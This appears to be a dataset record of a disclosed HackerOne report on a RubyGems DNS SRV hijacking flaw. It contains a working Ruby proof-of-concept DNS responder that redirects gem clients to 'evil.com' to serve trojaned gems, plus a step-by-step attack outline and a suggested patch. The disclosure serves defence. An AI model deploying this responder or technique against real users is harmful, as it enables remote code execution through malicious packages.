{
  "reported_to": "RubyGems",
  "reported_by": "claudijd ",
  "title": "Request Hijacking Vulnerability in RubyGems 2.6.11 and earlier",
  "content": "\nDescription:\nThe RubyGems client supports a gem server API discovery functionality,\nwhich is used when pushing or pulling gems to a gem distribution/hosting\nserver, like RubyGems.org. This functionality is provided via a SRV DNS\nrequest to the users gem source hostname prepended with \"_rubygems._tcp.\".\nThe response to this request tells the RubyGems client (aka: the gem\ncommand) where the users gem server API is. In the default RubyGems\nscenario, with a gem source of https://rubygems.org, the users SRV DNS\nrequest and reply will look like this:\n~ $ dig srv _rubygems._tcp.rubygems.org +short\n0 1 80 api.rubygems.org.\nDue to a deficiency in DNS response verification, a MiTM positioned\nattacker can poison the DNS response to this record response and force\nthe client to unknowingly download and install Ruby gems from an attacker\ncontrolled gem server in an alternate security domain. An example of\nsuch a scenario would look like so:\n~ $ dig _rubygems._tcp.rubygems.org SRV +short\n0 0 53 evil.com/api.rubygems.com.\nIn such a scenario, the attacker is able to serve the client malicious gem\ncontent, resulting in trivial remote code execution scenarios. For\nexample, the attacker could simply modify the gem source code and trigger\ncode execution via the extensions API at install time on the client machine\n(a gem trojaning technique described by Ben Smith in his \"Hacking with\nGems\" presentation at Aloha Ruby Conference in 2012 -\nhttps://www.youtube.com/watch?v=z-5bO0Q1J9s)/\nThis vulnerability has the same net effect/impact as CVE-2015-3900 and\nCVE-2015-4020.\nAffected method in Gem::RemoteFetcher:\nhttps://github.com/rubygems/rubygems/blob/5096fa35c1ca3e0a7d175aaf9d77cd93114fd977/lib/rubygems/remote_fetcher.rb#L101-L119\nPoC DNS SRV Responder:\n!/usr/bin/env ruby\nrequire 'rubydns'\nrequire 'rubydns/system'\nINTERFACES = [\n[:udp, \"0.0.0.0\", 53],\n[:tcp, \"0.0.0.0\", 53]\n]\nName = Resolv::DNS::Name\nIN = Resolv::DNS::Resource::IN\nRubyDNS::run_server(:listen => INTERFACES) do\nmatch(//, IN::SRV) do |transaction|\ntransaction.respond!(0,0,53,\"evil.com/api.rubygems.com\")\nend\nend\nRecommendations:\nConsider this small patch to address the immediate attack vector...\nif /.#{Regexp.quote(host)}\\z/ =~ target\nif (/.#{Regexp.quote(host)}\\z/ =~ target) && !target.include?(\"/\")\nAlso, consider moving away from doing API discovery via DNS. Would recommend\nmoving to HTTPS, where you will have a stronger transport security chain.\nReferences (these are not new, just references prior work here to help triage team understand impact):\nhttps://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2015-007/?fid=6356\nhttps://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2015-009/?fid=6478\nhttps://speakerdeck.com/claudijd/trojaned-gems-you-cant-tell-youre-using-one\nhttp://blog.rubygems.org/2015/05/14/CVE-2015-3900.html\n\n",
  "severity": [
    7.0,
    8.9
  ],
  "bounty": 1000,
  "weaknesses": [
    "Code Injection"
  ],
  "screenshots": {},
  "disclosed_date": 1504150560,
  "report_url": "https://hackerone.com/reports/218088",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "MEDIUM",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Perform a DNS SRV query for '_rubygems._tcp.rubygems.org' to discover the gem server API location."
    ],
    [
      2,
      "Intercept and poison the DNS response to redirect the client to an attacker-controlled server (e.g., 'evil.com/api.rubygems.com')."
    ],
    [
      3,
      "Serve malicious gem content from the attacker-controlled server to the client, leading to remote code execution."
    ]
  ],
  "vuln_description": "The vulnerability involves a deficiency in DNS response verification in RubyGems, allowing a MiTM attacker to poison DNS responses and redirect clients to malicious gem servers. This can lead to remote code execution via trojaned gems.",
  "reason": "The attack requires understanding DNS SRV records, MiTM capabilities, and gem trojaning techniques. However, the components (DNS poisoning, gem server redirection) are well-documented and the interaction is straightforward once the DNS response is manipulated.",
  "new_complexity": "MEDIUM",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "is_simple_payload": true
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves DNS response manipulation and gem server API discovery, which is outside the scope of the described authentication and authorization testing methodologies. The methodologies focus on user sessions, actions, and resource IDs within a single application, not on DNS or transport layer vulnerabilities.",
    "is_detectable": false
  }
}